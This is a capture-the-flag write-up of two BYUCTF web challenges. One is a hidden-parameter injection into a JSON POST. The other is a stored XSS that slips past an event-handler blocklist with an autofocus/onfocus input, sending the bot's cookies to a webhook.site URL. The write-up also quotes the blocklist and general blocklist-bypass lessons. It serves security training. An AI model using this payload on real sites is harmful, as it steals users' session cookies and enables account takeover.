# BYUCTF — Web Challenges Writeup

> **CTF:** BYUCTF · **Category:** Web

---

## Table of Contents

- [Challenge 1 — My Cat Website](#challenge-1--my-cat-website)
  - [Overview](#overview-1)
  - [Reconnaissance](#reconnaissance-1)
  - [Exploitation](#exploitation-1)
- [Challenge 2 — On Point](#challenge-2--on-point)
  - [Overview](#overview-2)
  - [Reconnaissance](#reconnaissance-2)
  - [Bypassing the Blocklist](#bypassing-the-blocklist)
  - [Exploitation](#exploitation-2)
- [Flags Summary](#flags-summary)
- [Takeaways](#takeaways)

---

## Challenge 1 — My Cat Website

### Overview-1

A simple web application where users submit information about their cat. The goal is to trigger a hidden flag-returning code path buried in the server logic.

| Field      | Detail                            |
|------------|-----------------------------------|
| Technique  | Source Code Review · Mass Assignment / Hidden Parameter Injection |
| Inputs     | `name`, `age`, `color`            |

---

### Reconnaissance-1

The application presents a form with three visible fields: **cat name**, **age**, and **color**. Reading the page source reveals a hidden variable:

```javascript
get_flag = false
```

Digging deeper into the provided source code, the server-side handler documents the expected JSON payload:

```json
// Expects JSON payload like:
{
    "name": "Whiskers",
    "age": 3,
    "color": "tabby",
    "is_happy": true
}
```

> **Key observation:** The server expects a fourth field — `is_happy` — that is not exposed anywhere in the UI. Combined with the `get_flag = false` variable, this strongly suggests that sending `get_flag: true` or satisfying a hidden condition (e.g., `is_happy: true`) triggers the flag.

---

### Exploitation-1

Intercept the form submission with **Burp Suite** and manually add the hidden parameter to the JSON body:

```http
POST /submit HTTP/1.1
Content-Type: application/json

{
    "name": "Whiskers",
    "age": 3,
    "color": "tabby",
    "is_happy": true,
    "get_flag": true
}
```

**Result:** The server returns the flag directly in the response. ✓

> **Vulnerability:** The backend trusts all fields in the JSON body without filtering undocumented parameters. By injecting `get_flag: true`, we bypass the UI restriction and trigger the hidden code path.

---

## Challenge 2 — On Point

### Overview-2

A blog/post submission platform with an **XSS** attack surface. The challenge provides a **bot** that automatically visits submitted links — acting as the victim. The goal is to steal the bot's cookies via a webhook.

| Field      | Detail                                                     |
|------------|------------------------------------------------------------|
| Technique  | Stored XSS · Event Handler Bypass · Cookie Exfiltration    |
| Target     | Bot's `document.cookie` → webhook                          |
| Webhook    | `https://webhook.site/ce97ca35-3f39-4368-8a8f-d78c768bce56` |

---

### Reconnaissance-2

Reading the application's source code reveals a server-side blocklist applied to all submitted content:

```python
_BLOCKED = [
    "script", "fetch", "xmlhttprequest",
    "onload", "onerror", "ontoggle", "onmouseover", "onmouseenter",
    "onmouseleave", "onmouseout", "onmousedown", "onmouseup", "ondblclick",
    "onclick", "onscroll", "onwheel", "onresize", "onkeydown", "onkeyup",
    "onkeypress", "onsubmit", "onchange", "oninput", "onblur",
    "oncontextmenu", "onpointerover", "onpointerdown", "onpointerup",
    "onpageshow", "onpagehide", "onhashchange", "onanimation", "ontransition",
]
```

The blocklist is extensive — it blocks `<script>`, `fetch`, common event handlers like `onclick`, `onload`, `onerror`, and most pointer/keyboard/scroll events.

> **What's NOT blocked:** `onfocus` — a focus event that fires automatically when an element receives focus via `autofocus`.

---

### Bypassing the Blocklist

Since `onfocus` is not in the blocklist and the `autofocus` attribute forces immediate focus on page load (no user interaction required), we can construct a self-triggering XSS payload that:

1. Renders an `<input>` element with `autofocus` — fires `onfocus` immediately when the bot visits the page
2. Uses `document.location` redirect (not `fetch` or `XMLHttpRequest`) to exfiltrate cookies — also not blocked

---

### Exploitation-2

Submit the following payload as a post/article body:

```html
<input onfocus="document.location=`https://webhook.site/ce97ca35-3f39-4368-8a8f-d78c768bce56?c=${document.cookie}`" autofocus>
```

**Flow:**

```
Bot visits link
    → page renders <input autofocus>
    → browser auto-focuses the input
    → onfocus fires immediately
    → document.location redirects to webhook with document.cookie appended
    → webhook receives GET request with bot's cookies
    → flag extracted from cookie value
```

**Webhook received:**

```
GET /?c=flag=byuctf{...}
```

**Flag** captured in the `c` query parameter. ✓

---

## Flags Summary

| # | Challenge       | Technique                              | How Flag Was Retrieved                        |
|---|-----------------|----------------------------------------|-----------------------------------------------|
| 1 | My Cat Website  | Hidden parameter injection             | Added `"get_flag": true` to JSON POST body    |
| 2 | On Point        | XSS bypass via `onfocus` + `autofocus` | Cookie exfiltrated to webhook via bot visit   |

---

## Takeaways

| # | Lesson |
|---|--------|
| 1 | **Read the source code** — hidden variables like `get_flag = false` and undocumented fields like `is_happy` are deliberate hints |
| 2 | **Blocklists always have gaps** — `_BLOCKED` covered 30+ event handlers but missed `onfocus`, a perfectly valid XSS trigger |
| 3 | **`autofocus` = zero-click XSS** — combined with `onfocus`, it fires without any user interaction, making it ideal for bot-based challenges |
| 4 | **`document.location` is not `fetch`** — when `fetch` and `XMLHttpRequest` are blocked, redirecting via `document.location` is a reliable cookie exfiltration alternative |
| 5 | **Bot victims = stored XSS targets** — if a challenge provides a bot that visits links, the intended solution almost always involves cookie theft via XSS |

---

*Writeup by [your-handle] · CTF: BYUCTF · Date: 2026-05-26*
